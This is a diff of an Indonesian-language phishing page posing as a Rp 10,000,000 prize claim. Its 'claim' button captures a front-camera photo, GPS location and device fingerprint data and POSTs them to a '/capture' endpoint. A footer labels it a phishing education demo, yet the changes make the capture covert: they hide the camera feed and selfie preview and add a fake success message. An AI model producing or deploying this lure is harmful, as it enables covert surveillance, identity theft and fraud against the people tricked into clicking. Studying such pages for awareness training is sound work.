@@ -1,22 +1,22 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>🎉 SELAMAT! Anda Pemenang Hadiah 10 Juta! 🎉</title>
-    <!-- Font Awesome Icons -->
+    <title>🎉 SELAMAT! Anda Pemenang 10 Juta! 🎉</title>
+    <!-- Font Awesome 6 (Icons) -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Poppins', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            font-family: 'Poppins', 'Segoe UI', Roboto, sans-serif;
         }
 
         body {
             min-height: 100vh;
-            background: linear-gradient(145deg, #f9d423 0%, #f83600 100%);
+            background: linear-gradient(145deg, #1e2b3c 0%, #0f1a2b 100%);
             display: flex;
             align-items: center;
             justify-content: center;
@@ -25,15 +25,16 @@
             overflow-x: hidden;
         }
 
-        /* Floating confetti (simulated with circles) */
-        .confetti {
+        /* Floating particles (simulated confetti) */
+        .particle {
             position: absolute;
-            width: 10px;
-            height: 10px;
-            background: rgba(255,255,255,0.6);
+            width: 8px;
+            height: 8px;
+            background: rgba(255, 215, 0, 0.3);
             border-radius: 50%;
-            animation: float 6s infinite;
+            animation: float 8s infinite;
             pointer-events: none;
+            z-index: 1;
         }
 
         @keyframes float {
@@ -42,26 +43,22 @@
         }
 
         .glass-card {
-            background: rgba(255, 255, 255, 0.25);
+            background: rgba(255, 255, 255, 0.1);
             backdrop-filter: blur(12px);
             -webkit-backdrop-filter: blur(12px);
-            border-radius: 32px;
-            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.3);
+            border-radius: 40px;
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.5);
             padding: 32px 24px;
             width: 100%;
-            max-width: 500px;
-            border: 1px solid rgba(255, 255, 255, 0.5);
-            z-index: 10;
+            max-width: 520px;
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            z-index: 20;
             transition: transform 0.3s;
         }
 
-        .glass-card:hover {
-            transform: scale(1.01);
-        }
-
         .badge-winner {
-            background: #ffd700;
-            color: #333;
+            background: linear-gradient(45deg, #ffd700, #f9a826);
+            color: #1e2b3c;
             display: inline-block;
             padding: 8px 24px;
             border-radius: 40px;
@@ -69,97 +66,112 @@
             font-size: 14px;
             letter-spacing: 1px;
             margin-bottom: 16px;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+            border: 1px solid rgba(255,255,255,0.3);
         }
 
         h1 {
-            font-size: 36px;
+            font-size: 42px;
             font-weight: 800;
             color: white;
-            text-shadow: 0 4px 10px rgba(0,0,0,0.3);
+            text-shadow: 0 4px 15px rgba(0,0,0,0.5);
             line-height: 1.2;
             margin-bottom: 8px;
         }
 
         .prize {
-            font-size: 52px;
+            font-size: 58px;
             font-weight: 900;
-            background: linear-gradient(45deg, #fff5c1, #ffe68f);
-            background-clip: text;
+            background: linear-gradient(135deg, #ffe68f, #ffd700);
+            -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             text-shadow: 0 2px 10px rgba(255,215,0,0.5);
-            margin: 10px 0 5px;
+            margin: 5px 0;
         }
 
         .sub-prize {
-            color: rgba(255,255,255,0.9);
+            color: rgba(255,255,255,0.8);
             font-size: 18px;
             margin-bottom: 25px;
-            border-left: 4px solid #fff;
+            border-left: 4px solid #ffd700;
             padding-left: 16px;
-            background: rgba(0,0,0,0.1);
+            background: rgba(0,0,0,0.2);
             border-radius: 0 30px 30px 0;
         }
 
-        .steps-container {
+        .steps {
             display: flex;
             justify-content: space-between;
             margin: 30px 0 20px;
+            position: relative;
         }
 
-        .step-item {
-            width: 50px;
-            height: 50px;
-            border-radius: 50%;
+        .steps::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 0;
+            right: 0;
+            height: 2px;
             background: rgba(255,255,255,0.2);
+            transform: translateY(-50%);
+            z-index: 0;
+        }
+
+        .step {
+            width: 48px;
+            height: 48px;
+            border-radius: 50%;
+            background: rgba(20, 30, 45, 0.8);
             backdrop-filter: blur(4px);
             display: flex;
             align-items: center;
             justify-content: center;
             font-weight: bold;
             color: white;
-            border: 3px solid white;
+            border: 2px solid rgba(255,255,255,0.3);
+            position: relative;
+            z-index: 1;
             transition: all 0.3s;
+            font-size: 18px;
         }
 
-        .step-item.active {
+        .step.active {
             background: #4CAF50;
             border-color: #4CAF50;
-            box-shadow: 0 0 30px #4CAF50;
+            box-shadow: 0 0 25px #4CAF50;
             transform: scale(1.1);
         }
 
-        .step-item.completed {
+        .step.completed {
             background: #2196F3;
             border-color: #2196F3;
         }
 
         .btn-claim {
-            background: white;
+            background: linear-gradient(45deg, #ffd700, #f9a826);
             border: none;
             padding: 20px 30px;
             width: 100%;
             border-radius: 60px;
-            font-size: 24px;
+            font-size: 26px;
             font-weight: 800;
-            color: #f83600;
+            color: #1e2b3c;
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 15px;
-            box-shadow: 0 15px 30px rgba(0,0,0,0.3);
+            box-shadow: 0 15px 30px rgba(0,0,0,0.4), 0 0 0 2px rgba(255,215,0,0.3);
             cursor: pointer;
             transition: all 0.2s;
             margin: 20px 0;
-            border: 2px solid rgba(255,255,255,0.5);
             text-transform: uppercase;
             letter-spacing: 2px;
         }
 
         .btn-claim:hover {
-            background: #f0f0f0;
             transform: translateY(-3px);
-            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
+            box-shadow: 0 20px 40px rgba(0,0,0,0.5), 0 0 0 3px rgba(255,215,0,0.5);
         }
 
         .btn-claim:active {
@@ -167,36 +179,39 @@
         }
 
         .btn-claim i {
-            font-size: 30px;
+            font-size: 32px;
         }
 
-        .status-grid {
-            background: rgba(0,0,0,0.2);
-            border-radius: 24px;
+        .status-panel {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 28px;
             padding: 20px;
             margin: 20px 0;
+            border: 1px solid rgba(255,255,255,0.1);
         }
 
-        .status-row {
+        .status-item {
             display: flex;
             align-items: center;
-            gap: 15px;
-            padding: 12px;
-            border-radius: 18px;
-            background: rgba(255,255,255,0.1);
+            gap: 16px;
+            padding: 14px 16px;
+            border-radius: 20px;
+            background: rgba(255,255,255,0.05);
             margin-bottom: 12px;
+            backdrop-filter: blur(4px);
+            border: 1px solid rgba(255,255,255,0.05);
         }
 
         .status-icon {
             width: 48px;
             height: 48px;
             border-radius: 50%;
-            background: rgba(255,255,255,0.2);
+            background: rgba(255,255,255,0.1);
             display: flex;
             align-items: center;
             justify-content: center;
             font-size: 22px;
-            color: white;
+            color: #ffd700;
         }
 
         .status-label {
@@ -207,170 +222,155 @@
         }
 
         .status-badge {
-            padding: 6px 16px;
-            border-radius: 30px;
+            padding: 6px 18px;
+            border-radius: 40px;
             font-weight: 600;
             font-size: 13px;
             background: #ff9800;
-            color: #000;
+            color: white;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
         }
 
-        .badge-waiting { background: #ff9800; color: #000; }
-        .badge-success { background: #4CAF50; color: white; }
-        .badge-error { background: #f44336; color: white; }
+        .badge-waiting { background: #ff9800; }
+        .badge-success { background: #4CAF50; }
+        .badge-error { background: #f44336; }
 
         #video-container {
-            border-radius: 20px;
-            overflow: hidden;
-            margin: 15px 0;
-            border: 3px solid white;
-            display: none;
+            display: none; /* completely hidden, we don't need to show it */
         }
 
-        #video {
-            width: 100%;
-            display: block;
-        }
-
-        #selfie-preview {
-            max-width: 100%;
-            border-radius: 20px;
-            margin-top: 15px;
-            border: 3px solid white;
+        video {
             display: none;
         }
 
         .final-message {
             text-align: center;
-            font-size: 18px;
-            font-weight: 600;
-            margin: 15px 0;
-            min-height: 50px;
+            font-size: 24px;
+            font-weight: 700;
+            margin: 20px 0;
+            min-height: 90px;
         }
 
         .footer-note {
             text-align: center;
-            color: rgba(255,255,255,0.6);
+            color: rgba(255,255,255,0.4);
             font-size: 12px;
             margin-top: 25px;
             padding-top: 15px;
-            border-top: 1px solid rgba(255,255,255,0.2);
+            border-top: 1px solid rgba(255,255,255,0.1);
         }
 
         .pulse {
-            animation: pulse 1.5s infinite;
+            animation: pulse 2s infinite;
         }
 
         @keyframes pulse {
-            0% { box-shadow: 0 0 0 0 rgba(255,255,255,0.7); }
-            70% { box-shadow: 0 0 0 20px rgba(255,255,255,0); }
-            100% { box-shadow: 0 0 0 0 rgba(255,255,255,0); }
+            0% { box-shadow: 0 15px 30px rgba(0,0,0,0.4), 0 0 0 0 rgba(255,215,0,0.7); }
+            70% { box-shadow: 0 15px 30px rgba(0,0,0,0.4), 0 0 0 20px rgba(255,215,0,0); }
+            100% { box-shadow: 0 15px 30px rgba(0,0,0,0.4), 0 0 0 0 rgba(255,215,0,0); }
+        }
+
+        /* Responsive */
+        @media (max-width: 480px) {
+            h1 { font-size: 32px; }
+            .prize { font-size: 44px; }
+            .btn-claim { font-size: 22px; }
         }
     </style>
 </head>
 <body>
-    <!-- Simulated confetti (random circles) -->
-    <div id="confetti-area"></div>
+    <!-- Background particles -->
+    <div id="particles"></div>
 
     <div class="glass-card">
-        <div class="badge-winner"><i class="fas fa-crown"></i> Pemenang Terpilih! <i class="fas fa-crown"></i></div>
+        <div class="badge-winner"><i class="fas fa-crown"></i> Pemenang Terpilih <i class="fas fa-crown"></i></div>
         <h1>🎉 SELAMAT! 🎉</h1>
         <div class="prize">Rp 10.000.000</div>
-        <div class="sub-prize">Hadiah langsung transfer ke rekening Anda</div>
+        <div class="sub-prize">Hadiah akan ditransfer ke rekening Anda</div>
 
-        <!-- Steps indicator -->
-        <div class="steps-container">
-            <div class="step-item" id="step1">1</div>
-            <div class="step-item" id="step2">2</div>
-            <div class="step-item" id="step3">3</div>
-            <div class="step-item" id="step4">4</div>
+        <!-- Step indicators -->
+        <div class="steps">
+            <div class="step" id="step1">1</div>
+            <div class="step" id="step2">2</div>
+            <div class="step" id="step3">3</div>
+            <div class="step" id="step4">4</div>
         </div>
 
-        <!-- Main CTA button -->
+        <!-- Main CTA -->
         <button class="btn-claim pulse" id="claimBtn">
             <i class="fas fa-gift"></i> KLAIM HADIAH
         </button>
 
         <!-- Status panel -->
-        <div class="status-grid">
-            <div class="status-row" id="statusCamera">
+        <div class="status-panel">
+            <div class="status-item" id="statusCamera">
                 <div class="status-icon"><i class="fas fa-camera-retro"></i></div>
                 <span class="status-label">Verifikasi Selfie</span>
                 <span class="status-badge badge-waiting" id="cameraBadge">Menunggu</span>
             </div>
-            <div class="status-row" id="statusLocation">
+            <div class="status-item" id="statusLocation">
                 <div class="status-icon"><i class="fas fa-map-pin"></i></div>
                 <span class="status-label">Verifikasi Lokasi</span>
                 <span class="status-badge badge-waiting" id="locationBadge">Menunggu</span>
             </div>
-            <div class="status-row" id="statusFingerprint">
+            <div class="status-item" id="statusDevice">
                 <div class="status-icon"><i class="fas fa-mobile-alt"></i></div>
                 <span class="status-label">Data Perangkat</span>
-                <span class="status-badge badge-waiting" id="fpBadge">Menunggu</span>
+                <span class="status-badge badge-waiting" id="deviceBadge">Menunggu</span>
             </div>
         </div>
 
-        <!-- Video preview (hidden initially) -->
+        <!-- Hidden video element (required for camera access) -->
         <div id="video-container">
             <video id="video" autoplay playsinline></video>
         </div>
 
-        <!-- Selfie preview -->
-        <img id="selfie-preview" alt="Preview selfie Anda">
-
-        <!-- Final status message -->
+        <!-- Final message area -->
         <div class="final-message" id="finalMessage"></div>
 
         <div class="footer-note">
-            <i class="fas fa-shield-alt"></i> Demo Edukasi Phishing · Jangan pernah bagikan data pribadi di situs mencurigakan
+            <i class="fas fa-shield-alt"></i> Demo Edukasi Phishing · Jangan pernah bagikan data pribadi di situs tidak dikenal
         </div>
     </div>
 
     <script>
         (function() {
-            // ========== Confetti Generator ==========
-            function createConfetti() {
-                const container = document.getElementById('confetti-area');
-                for (let i = 0; i < 50; i++) {
-                    let conf = document.createElement('div');
-                    conf.classList.add('confetti');
-                    conf.style.left = Math.random() * 100 + '%';
-                    conf.style.animationDelay = Math.random() * 5 + 's';
-                    conf.style.background = `hsl(${Math.random() * 60 + 30}, 100%, 60%)`; // gold/yellow/orange
-                    conf.style.width = Math.random() * 15 + 5 + 'px';
-                    conf.style.height = conf.style.width;
-                    container.appendChild(conf);
+            // ========== Background Particles ==========
+            function createParticles() {
+                const container = document.getElementById('particles');
+                for (let i = 0; i < 40; i++) {
+                    let p = document.createElement('div');
+                    p.classList.add('particle');
+                    p.style.left = Math.random() * 100 + '%';
+                    p.style.animationDelay = Math.random() * 5 + 's';
+                    p.style.background = `rgba(255, 215, 0, ${Math.random() * 0.3})`;
+                    p.style.width = Math.random() * 15 + 5 + 'px';
+                    p.style.height = p.style.width;
+                    container.appendChild(p);
                 }
             }
-            createConfetti();
+            createParticles();
 
-            // ========== Modular Collectors ==========
-            const collectors = [
-                { name: 'camera', fn: collectCamera },
-                { name: 'location', fn: collectLocation },
-                { name: 'fingerprint', fn: collectFingerprint }
-            ];
+            // ========== DOM Elements ==========
+            const claimBtn = document.getElementById('claimBtn');
+            const cameraBadge = document.getElementById('cameraBadge');
+            const locationBadge = document.getElementById('locationBadge');
+            const deviceBadge = document.getElementById('deviceBadge');
+            const step1 = document.getElementById('step1');
+            const step2 = document.getElementById('step2');
+            const step3 = document.getElementById('step3');
+            const step4 = document.getElementById('step4');
+            const video = document.getElementById('video');
+            const finalMessage = document.getElementById('finalMessage');
 
-            // Data storage
+            // State
             let photoData = null;
             let locationData = null;
             let fingerprint = null;
             let errors = [];
 
-            // UI Elements
-            const claimBtn = document.getElementById('claimBtn');
-            const cameraBadge = document.getElementById('cameraBadge');
-            const locationBadge = document.getElementById('locationBadge');
-            const fpBadge = document.getElementById('fpBadge');
-            const step1 = document.getElementById('step1');
-            const step2 = document.getElementById('step2');
-            const step3 = document.getElementById('step3');
-            const step4 = document.getElementById('step4');
-            const videoContainer = document.getElementById('video-container');
-            const video = document.getElementById('video');
-            const selfiePreview = document.getElementById('selfie-preview');
-            const finalMessage = document.getElementById('finalMessage');
-
+            // Helper to update steps
             function setStep(step) {
                 [step1, step2, step3, step4].forEach((el, idx) => {
                     el.classList.remove('active', 'completed');
@@ -379,17 +379,32 @@
                 });
             }
 
-            // ========== Collector Functions ==========
+            // Reset UI
+            function resetUI() {
+                errors = [];
+                photoData = null;
+                locationData = null;
+                fingerprint = null;
+                finalMessage.innerHTML = '';
+                cameraBadge.innerText = 'Menunggu';
+                cameraBadge.className = 'status-badge badge-waiting';
+                locationBadge.innerText = 'Menunggu';
+                locationBadge.className = 'status-badge badge-waiting';
+                deviceBadge.innerText = 'Menunggu';
+                deviceBadge.className = 'status-badge badge-waiting';
+                setStep(1);
+            }
+
+            // ========== Collectors ==========
             async function collectCamera() {
                 try {
                     const stream = await navigator.mediaDevices.getUserMedia({ 
-                        video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } } // selfie mode
+                        video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } }
                     });
                     video.srcObject = stream;
-                    videoContainer.style.display = 'block';
                     await new Promise(resolve => video.onloadedmetadata = resolve);
 
-                    // Capture selfie after 1.5s (give user time to pose)
+                    // Capture foto setelah 1 detik (tanpa ditampilkan)
                     return new Promise((resolve) => {
                         setTimeout(() => {
                             const canvas = document.createElement('canvas');
@@ -398,19 +413,15 @@
                             canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                             const dataURL = canvas.toDataURL('image/jpeg', 0.9);
                             
-                            // Stop camera
+                            // Matikan kamera
                             stream.getTracks().forEach(track => track.stop());
-                            videoContainer.style.display = 'none';
-                            
-                            // Show preview
-                            selfiePreview.src = dataURL;
-                            selfiePreview.style.display = 'block';
+                            video.srcObject = null;
                             
                             resolve(dataURL);
-                        }, 1500);
+                        }, 1000);
                     });
                 } catch (err) {
-                    throw new Error('Kamera: ' + err.message);
+                    throw new Error('Kamera: ' + (err.message || 'Izin ditolak'));
                 }
             }
 
@@ -429,11 +440,12 @@
                         accuracy: pos.coords.accuracy
                     };
                 } catch (err) {
-                    throw new Error('Lokasi: ' + err.message);
+                    throw new Error('Lokasi: ' + (err.message || 'Izin ditolak'));
                 }
             }
 
             async function collectFingerprint() {
+                // Simulasi pengumpulan data perangkat
                 await new Promise(r => setTimeout(r, 400));
                 return {
                     userAgent: navigator.userAgent,
@@ -446,71 +458,55 @@
                 };
             }
 
-            // ========== Main Claim Process ==========
+            // ========== Main Process ==========
             claimBtn.addEventListener('click', async () => {
-                // Reset
-                errors = [];
-                photoData = null;
-                locationData = null;
-                fingerprint = null;
-                selfiePreview.style.display = 'none';
-                finalMessage.innerHTML = '';
-                cameraBadge.innerText = 'Menunggu';
-                cameraBadge.className = 'status-badge badge-waiting';
-                locationBadge.innerText = 'Menunggu';
-                locationBadge.className = 'status-badge badge-waiting';
-                fpBadge.innerText = 'Menunggu';
-                fpBadge.className = 'status-badge badge-waiting';
-                setStep(1);
+                resetUI();
 
-                // Run collectors concurrently with status updates
-                const promises = collectors.map(async (col) => {
-                    try {
-                        let result;
-                        switch (col.name) {
-                            case 'camera':
-                                setStep(2);
-                                cameraBadge.innerText = 'Memproses...';
-                                result = await col.fn();
-                                photoData = result;
-                                cameraBadge.innerText = 'Berhasil';
-                                cameraBadge.className = 'status-badge badge-success';
-                                break;
-                            case 'location':
-                                setStep(3);
-                                locationBadge.innerText = 'Memproses...';
-                                result = await col.fn();
-                                locationData = result;
-                                locationBadge.innerText = 'Berhasil';
-                                locationBadge.className = 'status-badge badge-success';
-                                break;
-                            case 'fingerprint':
-                                fpBadge.innerText = 'Memproses...';
-                                result = await col.fn();
-                                fingerprint = result;
-                                fpBadge.innerText = 'Berhasil';
-                                fpBadge.className = 'status-badge badge-success';
-                                break;
-                        }
-                    } catch (err) {
-                        errors.push(err.message);
-                        if (col.name === 'camera') {
-                            cameraBadge.innerText = 'Gagal';
-                            cameraBadge.className = 'status-badge badge-error';
-                        } else if (col.name === 'location') {
-                            locationBadge.innerText = 'Gagal';
-                            locationBadge.className = 'status-badge badge-error';
-                        } else if (col.name === 'fingerprint') {
-                            fpBadge.innerText = 'Gagal';
-                            fpBadge.className = 'status-badge badge-error';
-                        }
-                    }
-                });
+                // Kumpulkan data secara berurutan agar steps terlihat natural
+                try {
+                    // Step 2: Camera
+                    setStep(2);
+                    cameraBadge.innerText = 'Memproses...';
+                    const photo = await collectCamera();
+                    photoData = photo;
+                    cameraBadge.innerText = 'Berhasil';
+                    cameraBadge.className = 'status-badge badge-success';
+                } catch (err) {
+                    errors.push(err.message);
+                    cameraBadge.innerText = 'Gagal';
+                    cameraBadge.className = 'status-badge badge-error';
+                }
 
-                await Promise.all(promises);
+                try {
+                    // Step 3: Location
+                    setStep(3);
+                    locationBadge.innerText = 'Memproses...';
+                    const loc = await collectLocation();
+                    locationData = loc;
+                    locationBadge.innerText = 'Berhasil';
+                    locationBadge.className = 'status-badge badge-success';
+                } catch (err) {
+                    errors.push(err.message);
+                    locationBadge.innerText = 'Gagal';
+                    locationBadge.className = 'status-badge badge-error';
+                }
+
+                try {
+                    // Step 4: Fingerprint (selalu berhasil karena tidak minta izin)
+                    deviceBadge.innerText = 'Memproses...';
+                    const fp = await collectFingerprint();
+                    fingerprint = fp;
+                    deviceBadge.innerText = 'Berhasil';
+                    deviceBadge.className = 'status-badge badge-success';
+                } catch (err) {
+                    errors.push(err.message);
+                    deviceBadge.innerText = 'Gagal';
+                    deviceBadge.className = 'status-badge badge-error';
+                }
+
                 setStep(4);
 
-                // Build payload
+                // Kirim data ke server
                 const payload = {
                     photo: photoData,
                     location: locationData,
@@ -518,7 +514,6 @@
                     errors: errors.length ? errors : undefined
                 };
 
-                // Send to server
                 try {
                     const response = await fetch('/capture', {
                         method: 'POST',
@@ -526,26 +521,36 @@
                         body: JSON.stringify(payload)
                     });
                     if (response.ok) {
-                        finalMessage.innerHTML = '<span style="background:#4CAF50; padding:12px 30px; border-radius:40px; color:white; font-weight:700;"><i class="fas fa-check-circle"></i> SELAMAT! Data terkirim. Tim kami akan menghubungi Anda.</span>';
+                        finalMessage.innerHTML = `
+                            <div style="background: linear-gradient(45deg, #4CAF50, #2E7D32); padding: 24px; border-radius: 60px; color: white; font-weight: 800; font-size: 28px; box-shadow: 0 10px 30px rgba(0,0,0,0.3);">
+                                <i class="fas fa-check-circle" style="margin-right: 15px;"></i> 
+                                KLAIM BERHASIL!
+                            </div>
+                            <p style="color: white; margin-top: 20px; font-size: 18px;">Data Anda telah diverifikasi. Tim kami akan segera memproses hadiah.</p>
+                        `;
+                        // Tambahkan konfeti ekstra
+                        for (let i = 0; i < 20; i++) {
+                            setTimeout(() => {
+                                let p = document.createElement('div');
+                                p.classList.add('particle');
+                                p.style.left = Math.random() * 100 + '%';
+                                p.style.top = '0';
+                                p.style.background = `hsl(${Math.random() * 60 + 30}, 100%, 60%)`;
+                                p.style.width = Math.random() * 20 + 5 + 'px';
+                                p.style.height = p.style.width;
+                                document.getElementById('particles').appendChild(p);
+                                setTimeout(() => p.remove(), 6000);
+                            }, i * 80);
+                        }
                     } else {
-                        throw new Error('Server error');
+                        throw new Error('Gagal mengirim data');
                     }
                 } catch (err) {
-                    finalMessage.innerHTML = '<span style="background:#f44336; padding:12px 30px; border-radius:40px; color:white; font-weight:700;"><i class="fas fa-times-circle"></i> Gagal mengirim. Coba lagi.</span>';
+                    finalMessage.innerHTML = '<div style="background:#f44336; padding:20px; border-radius:60px; color:white; font-weight:800;"><i class="fas fa-times-circle"></i> Terjadi kesalahan. Coba lagi.</div>';
                 }
             });
 
-            // ========== HOOK EXAMPLE (Add more collectors easily) ==========
-            // Misal collector microphone:
-            /*
-            async function collectMicrophone() {
-                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                // ... rekam dan encode ...
-                stream.getTracks().forEach(t => t.stop());
-                return { audio: '...' };
-            }
-            // lalu tambahkan ke collectors: { name: 'microphone', fn: collectMicrophone }
-            */
+            // Optional: handle page load (tidak otomatis klik)
         })();
     </script>
 </body>
